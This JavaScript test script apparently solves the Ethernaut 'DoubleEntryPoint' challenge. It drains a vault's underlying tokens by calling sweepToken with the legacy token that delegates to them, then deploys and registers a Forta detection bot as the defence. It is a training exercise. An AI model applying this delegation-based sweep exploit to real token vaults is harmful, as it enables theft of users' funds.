const { expect } = require("chai")
const { createChallenge, submitLevel } = require("./utils")

let s1, attacker, challenge, tx

before(async () => {
    ;[s1] = await ethers.getSigners()
    const challengeAddress = await createChallenge("0x34bD06F195756635a10A7018568E033bC15F3FB5")
    challenge = await ethers.getContractAt("DoubleEntryPoint", challengeAddress)
})

it("solves the challenge", async function () {
    try {
        let player = await challenge.player()
        console.log("Player: ", player)

        let vaultAddress = await challenge.cryptoVault()
        console.log("Vault address: ", vaultAddress)
        let vault = await ethers.getContractAt("CryptoVault", vaultAddress)
        let vaultUnderlying = await vault.underlying()
        console.log("Vault underlying: ", vaultUnderlying) // => 0xC939B2d3E3f8c85E67a990C6dde7298226bfE3fA

        let vaultDelegatedFrom = await challenge.delegatedFrom()
        console.log("Vault Legacy Token: ", vaultDelegatedFrom)
        let legacyToken = await ethers.getContractAt("LegacyToken", vaultDelegatedFrom)
        let legacyDelegate = await legacyToken.delegate()
        console.log("Legacy delegate: ", legacyDelegate) // => 0xC939B2d3E3f8c85E67a990C6dde7298226bfE3fA

        //the delegate of the lagacy token we specified in our DEP token (delegatedFrom) is the same as the underlying token in the Vault
        //that's a problem, because we should not be able to sweep the underlying token of the Vault =>
        //however, with this configuration we can do so
        let underlyingToken = await ethers.getContractAt("ERC20", vaultUnderlying)
        console.log("Underlying before sweep: ", await underlyingToken.balanceOf(vaultAddress))

        let sweptTokensRecipient = await vault.sweptTokensRecipient()
        console.log("Recip. before sweep: ", await underlyingToken.balanceOf(sweptTokensRecipient))

        //we specify the Legacy token, which is different from the Vault underlying token => the require(...) in sweepToken passes
        //the transfer in th eLegacy token is executed => delegate.delegateTransfer(to, value, msg.sender);
        tx = await vault.sweepToken(vaultDelegatedFrom)
        await tx.wait()

        console.log("Underlying after sweep: ", await underlyingToken.balanceOf(vaultAddress))
        console.log("Recip. after sweep: ", await underlyingToken.balanceOf(sweptTokensRecipient))

        //because, we already swept the token, we have to get a new DEP contract
        const challengeAddress = await createChallenge("0x34bD06F195756635a10A7018568E033bC15F3FB5")
        challenge = await ethers.getContractAt("DoubleEntryPoint", challengeAddress)
        vaultAddress = await challenge.cryptoVault()

        //deploy the bot
        const botFactory = await ethers.getContractFactory("DetectionBot")
        const bot = await botFactory.deploy(vaultAddress)

        // set the detection bot in Forta
        const fortaAddress = await challenge.forta()
        const forta = await ethers.getContractAt("Forta", fortaAddress)
        tx = await forta.setDetectionBot(bot.address)
        await tx.wait()
    } catch (err) {
        console.log(err)
    }
})

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true
})
